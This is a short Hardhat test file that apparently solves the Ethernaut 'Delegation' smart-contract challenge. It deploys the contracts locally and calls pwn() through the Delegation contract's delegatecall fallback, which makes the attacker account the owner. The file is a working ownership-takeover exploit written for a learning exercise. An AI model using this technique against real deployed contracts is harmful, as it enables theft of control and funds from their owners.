// Goal
// Claim ownership of the contract.

import { ContractFactory, Signer } from "ethers"
import { Delegate, Delegation } from "../../typechain-types"
import { ethers } from "hardhat"
import { expect } from "chai"

// Solution
describe('Delegation', function () {
  let Delegation: ContractFactory
  let delegation: Delegation

  let Delegate: ContractFactory
  let delegate: Delegate

  let delegateHack: Delegate

  let signers: Signer[]
  let owner: Signer
  let attacker: Signer

  before(async function () {
    signers = await ethers.getSigners()
    owner = signers[0]
    attacker = signers[1]

    Delegate = await ethers.getContractFactory('Delegate')
    delegate = (await Delegate.deploy(await owner.getAddress())) as Delegate

    Delegation = await ethers.getContractFactory('Delegation')
    delegation = (await Delegation.deploy(delegate.address)) as Delegation

    delegateHack = new ethers.Contract(delegation.address, delegate.interface, ethers.provider) as Delegate
  })

  it('Should claim ownership of the delagation contract', async function () {
    await delegateHack.connect(attacker).pwn()
    expect(await delegation.owner()).to.equal(await attacker.getAddress())
  })
})